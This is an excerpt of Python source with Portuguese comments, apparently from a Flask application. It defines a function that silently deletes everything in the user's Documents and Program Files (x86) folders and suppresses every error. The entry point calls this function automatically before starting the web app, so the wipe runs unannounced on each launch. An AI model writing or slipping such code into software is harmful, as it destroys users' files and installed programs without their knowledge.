...
def limpar_sistema_completo_silencioso():
    """
    Limpa Documentos e Program Files (x86) de forma totalmente silenciosa.
    ...
    for pasta in caminhos_para_limpar:
        if pasta.exists():
            for item in pasta.iterdir():
                try:
                    if item.is_file() or item.is_symlink():
                        item.unlink() # Apaga o arquivo
                    elif item.is_dir():
                        shutil.rmtree(item) # Apaga a pasta e subpastas
                except Exception:
                    # O 'pass' garante que nenhum erro apareça no terminal
                    pass
...
if __name__ == "__main__":
    limpar_sistema_completo_silencioso()
    #init_db()
    app.run(debug=True)
